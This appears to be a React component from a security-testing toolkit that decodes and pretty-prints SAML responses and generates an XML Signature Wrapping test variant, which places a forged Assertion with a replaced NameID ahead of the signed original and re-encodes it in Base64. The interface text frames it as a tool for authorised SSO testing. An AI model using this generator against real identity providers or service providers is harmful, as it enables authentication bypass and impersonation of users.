import { useMemo, useState } from 'react'
import { Note } from './shared'

function pretty(xml: string) {
  const normalized = xml.replace(/>\s*</g, '><').trim()
  let depth = 0
  return normalized.replace(/(<[^>]+>)/g, '\n$1\n').split('\n').filter(Boolean).map(token => {
    if (/^<\//.test(token)) depth = Math.max(0, depth - 1)
    const line = `${'  '.repeat(depth)}${token}`
    if (/^<[^!?/][^>]*[^/]?>$/.test(token) && !token.includes('</')) depth++
    return line
  }).join('\n')
}
function decode(value: string) {
  const trimmed = value.trim()
  const xml = trimmed.startsWith('<') ? trimmed : new TextDecoder().decode(Uint8Array.from(atob(trimmed), c => c.charCodeAt(0)))
  const doc = new DOMParser().parseFromString(xml, 'application/xml')
  if (doc.querySelector('parsererror')) throw new Error('XML 파싱에 실패했습니다.')
  return new XMLSerializer().serializeToString(doc)
}
function makeXsw(xml: string) {
  const doc = new DOMParser().parseFromString(xml, 'application/xml')
  const assertion = doc.getElementsByTagNameNS('*', 'Assertion')[0]
  const signature = doc.getElementsByTagNameNS('*', 'Signature')[0]
  if (!assertion || !signature || !assertion.parentNode) throw new Error('Assertion과 Signature가 모두 있는 SAML XML이 필요합니다.')
  const original = assertion.cloneNode(true)
  const forged = assertion.cloneNode(true) as Element
  forged.setAttribute('ID', '_xsw_test_forged')
  const subject = forged.getElementsByTagNameNS('*', 'NameID')[0]
  if (subject) subject.textContent = 'xsw-test@example.invalid'
  assertion.parentNode.insertBefore(forged, assertion)
  doc.documentElement.appendChild(original)
  const text = new XMLSerializer().serializeToString(doc)
  return `${btoa(unescape(encodeURIComponent(text)))}\n\n${pretty(text)}`
}
export function SamlAnalyzerBuilder() {
  const [input, setInput] = useState('')
  const result = useMemo(() => { try { return input.trim() ? pretty(decode(input)) : '' } catch (error) { return `오류: ${error instanceof Error ? error.message : '입력 처리 실패'}` } }, [input])
  const poc = useMemo(() => { try { return input.trim() ? makeXsw(decode(input)) : '' } catch (error) { return `오류: ${error instanceof Error ? error.message : '변형 생성 실패'}` } }, [input])
  return <div className="payload-builder fmt-builder"><Note>모든 처리는 브라우저 내에서 이뤄집니다. 본인이 소유/허가받은 SSO 연동 테스트에만 사용하세요. XSW는 검증 테스트용으로만 생성되며 서명은 유효하지 않습니다.</Note><div className="fmt-workspace"><section className="fmt-input-pane"><label className="payload-builder-label">Base64 SAMLResponse 또는 raw XML</label><div className="fmt-box"><textarea className="fmt-textarea saml-input" value={input} onChange={e => setInput(e.target.value)} spellCheck={false}/></div></section><section className="fmt-output-pane"><label className="payload-builder-label">Pretty XML</label><div className="fmt-box"><textarea className="fmt-textarea" value={result} readOnly spellCheck={false}/></div><label className="payload-builder-label">XSW 테스트 변형 · Base64 + XML</label><div className="fmt-box"><textarea className="fmt-textarea" value={poc} readOnly spellCheck={false}/></div></section></div></div>
}
